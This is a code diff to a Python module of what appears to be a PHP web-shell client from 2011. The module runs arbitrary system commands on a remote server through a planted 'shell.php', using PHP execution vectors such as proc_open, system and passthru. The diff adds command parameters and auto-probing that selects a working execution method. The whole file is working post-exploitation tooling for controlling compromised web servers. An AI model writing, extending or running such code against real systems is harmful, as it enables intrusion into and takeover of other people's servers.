@@ -6,6 +6,7 @@ Created on 22/ago/2011
 
 from core.module import Module, ModuleException
 from core.vector import VectorList, Vector
+from core.parameters import ParametersList, Parameter as P
 import random
 
 classname = 'Sh'
@@ -32,6 +33,13 @@ while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($
 fclose($pipes[2]); proc_close($h);"""),
             ])
     
+    
+    params = ParametersList('System shell', vectors.get_names_list(),
+                    P(arg='cmd', help='Shell command', required=True, pos=0),
+                    P(arg='stderr', help='Print standard error', default=True, type=bool)
+                    )
+    
+    
 #    vectors = { 'shell.php' : { 
 #                               "system"       : "system('%s 2>&1');",
 #                                "passthru"     : "passthru('%s 2>&1');",
@@ -57,54 +65,58 @@ fclose($pipes[2]); proc_close($h);"""),
         try: 
             modhandler.load('shell.php')
         except ModuleException, e:
-            pass
+            raise
         else:
             Module.__init__(self, modhandler, url, password)
         
-        if not self.payload:
-            raise ModuleException("shell.sh",  "Shell interpreter initialization failed")
         
         
-    def __execute_payload(self, vector):
+    def __execute_slack_probe(self, vector):
         
         
         try:
             rand     = random.randint( 11111, 99999 )
-            response = self.run( "echo %d" % rand, True, vector.payloads[0] )
+            response = self.run_module( "echo %d" % rand, True, vector.payloads[0] )
             if response == str(rand):
-                self.payload = vector.payloads[0]
                 self.mprint("[%s] Loaded using method '%s'" % (self.name, vector.name))
                 return True
 
         except:
-            pass
+            #pass
+            raise
         return False
         
         
-    def _probe( self ):
+    def __slack_probe( self ):
 
         vectors = self._get_default_vector2() 
+        
         if not vectors:
             vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
         
+        
         for vector in vectors:
-            response = self.__execute_payload(vector)
+            response = self.__execute_slack_probe(vector)
                 
             if response:
+                self.payload = vector.payloads[0]
                 self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
-                return response
+                return
 
                 
-        raise ModuleException(self.name,  "Error loading system shell interpreter")
+        raise ModuleException("shell.sh",  "Shell interpreter initialization failed")
                 
 
-
-    def run( self, cmd, err_to_stdout = True, payload = None ):
+    def run_module( self, cmd, err_to_stdout = True, payload = None ):
         
-        if not payload:
+        
+        if not payload: 
+            if not self.payload:
+                self.__slack_probe()
             payload = self.payload
+            
 
-        if not err_to_stdout and ' 2>&1' in payload:
+        if err_to_stdout == False and ' 2>&1' in payload:
             payload = payload.replace(' 2>&1', '')
 
         if payload.count( '%s' ) == 1:
@@ -114,7 +126,7 @@ fclose($pipes[2]); proc_close($h);"""),
             cmd     = cmd.split()[0]
             payload = payload % ( args, cmd )
         
-        return self.modhandler.load('shell.php').run(payload)
+        return self.modhandler.load('shell.php').run_module(payload)
 
 
 
